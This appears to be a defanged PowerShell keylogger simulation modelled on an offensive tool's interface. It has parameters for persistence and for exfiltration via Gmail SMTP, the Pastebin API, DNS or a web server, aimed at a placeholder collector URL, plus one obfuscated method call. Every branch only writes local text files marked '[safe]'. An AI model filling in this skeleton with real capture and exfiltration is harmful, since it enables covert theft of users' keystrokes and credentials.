Function Keylogger {
    [CmdletBinding()]
    Param(
        [String]$MagicString = "stopthis" , 
        [String]$CheckURL = "https://example.invalid/control.txt" , 
        [switch]$Exfil , 
        [ValidateSet("gmail" , "pastebin" , "WebServer" , "DNS")]
        [String]$ExfilOption = "WebServer" , 
        [String]$URL = "https://collector.example.invalid/ingest" , 
        [switch]$Persist , 
        [String]$SampleInput = "demo.user<Tab>hello123<Enter>"
    )

    $artifactDir = Join-Path $PSScriptRoot "artifacts\keylogger"
    If ( -Not (Test-Path $artifactDir )) {
        $Null = New-Item -ItemType Directory -Path $artifactDir -Force
    }

    $logPath = Join-Path $artifactDir "key.log"
    $capture = $SampleInput `
         -Replace "<Tab>" , "[TAB]" `
         -Replace "<Enter>" , "[ENTER]"

    Set-Content -Path $logPath -Value $capture -Encoding UTF8
    Write-Output "[safe] Simulated keystrokes written to $logPath"

    If ($Persist ) {
        $persistNote = Join-Path $artifactDir "persistence-note.txt"
        Set-Content -Path $persistNote -Value "[safe] Persistence requested but not installed." -Encoding UTF8
        Write-Output "[safe] Persistence step was simulated only."
    }

    If ($Exfil ) {
        $exfilPath = Join-Path $artifactDir ("exfil-" + $ExfilOption.("{2}{0}{1}" -f 'oLo' , 'wer' , 'T')."inVoKe"() + ".txt")

        Switch ($ExfilOption ) {
            "gmail" {
                $content = @(
                    "[safe] Would send email exfiltration."
                    "SMTP: smtp.gmail.com"
                    "Message: $capture"
                )
            }
            "pastebin" {
                $content = @(
                    "[safe] Would create a paste."
                    "Endpoint: https://pastebin.com/api/api_post.php"
                    "Body: $capture"
                )
            }
            "DNS" {
                $content = @(
                    "[safe] Would exfiltrate via DNS."
                    "Query: $capture"
                )
            }
            default {
                $content = @(
                    "[safe] Would POST captured keys to web server."
                    "URL: $URL"
                    "Body: $capture"
                )
            }
        }

        Set-Content -Path $exfilPath -Value $content -Encoding UTF8
        Write-Output "[safe] Exfiltration simulated via $ExfilOption."
    }

    Write-Output "[safe] Magic stop string remains configured as '$MagicString' from $CheckURL"
}

keylogger -exfil -exfiloption WebServer -url "https://collector.example.invalid/ingest"
